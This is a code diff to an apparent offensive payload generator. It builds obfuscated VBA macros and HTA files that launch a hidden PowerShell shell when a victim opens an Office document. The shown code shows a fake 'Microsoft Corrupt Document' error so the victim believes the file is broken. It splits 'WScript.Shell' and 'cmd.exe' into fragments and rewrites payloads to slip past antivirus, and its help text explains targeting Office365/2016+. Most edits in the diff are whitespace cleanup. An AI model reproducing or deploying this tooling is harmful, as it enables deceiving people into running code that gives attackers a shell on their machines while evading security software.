@@ -115,11 +115,11 @@ is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! 
 victim to thinking the excel document is corrupted. You should get a shell through powershell injection
 after that.
 
-""" +  ColorsEnum.RED + """If you are deploying this against Office365/2016+ versions of Word you need to modify the first line of 
+""" +  ColorsEnum.RED + """If you are deploying this against Office365/2016+ versions of Word you need to modify the first line of
 the output from: Sub Auto_Open()
- 
+
 To: Sub AutoOpen()
- 
+
 The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme.""" + ColorsEnum.ENDC + """
 
 NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
@@ -336,7 +336,7 @@ def generate_macro(full_attack, line_length=380):
     function6 = generate_random_string(5, 15)
 
     # our final product of obfsucated code
-    macro_str += ("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\n{14} = {15} & " "\n{16} = {17}.Run({18} & {19}, 0, False)\nDim title As String\ntitle = "Microsoft Corrupt Document"\nDim msg As String\nDim intResponse As Integer\nmsg = "The document appears to be made on an older version of Microsoft. Please have the creator save to a newer and supported format."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(
+    macro_str += ("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\nDim {14}\n{14} = {15} & " "\n{16} = {17}.Run({18} & {19}, 0, False)\nDim title As String\ntitle = "Microsoft Corrupt Document"\nDim msg As String\nDim intResponse As Integer\nmsg = "The document appears to be made on an older version of Microsoft. Please have the creator save to a newer and supported format."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(
         function1, function1, shell, function2, function2, wscript, function3, function3, function2, function1, function4, function5, function4, function3, function6, ps_long, function5, function4, function6, macro_rand))
 
     return macro_str
@@ -392,7 +392,7 @@ def gen_hta_attack(command):
     cmd_split2 = generate_random_string(10, 30)
     cmd_split3 = generate_random_string(10, 30)
     cmd_split4 = generate_random_string(10, 30)
-    
+
     main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, shell_split5))
     main2 = ("""{0} = "cm";\n{1} = "d.e";\n{2} = "xe";\n{3} = ({0} + {1} + {2});\n{4}.run('%windir%\\\\System32\\\\""".format(cmd_split1,cmd_split2,cmd_split3,cmd_split4,hta_rand))
     main3 = ("""' + {0} + """.format(cmd_split4))
@@ -401,7 +401,7 @@ def gen_hta_attack(command):
 
     # remote old directory
     if os.path.isdir("hta_attack"):
-        shutil.rmtree("hta_attack") 
+        shutil.rmtree("hta_attack")
 
     os.makedirs("hta_attack")
 
@@ -524,7 +524,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     for non_signature in avnotftw:
         non_signature = non_signature.rstrip()
         if counter > 0: haha_av = haha_av + "+"
-        if counter > 0: haha_av = haha_av + "'" 
+        if counter > 0: haha_av = haha_av + "'"
         surprise_surprise = non_signature + "'"
         haha_av = haha_av + surprise_surprise #ThisShouldKeepMattHappy
         counter = 1
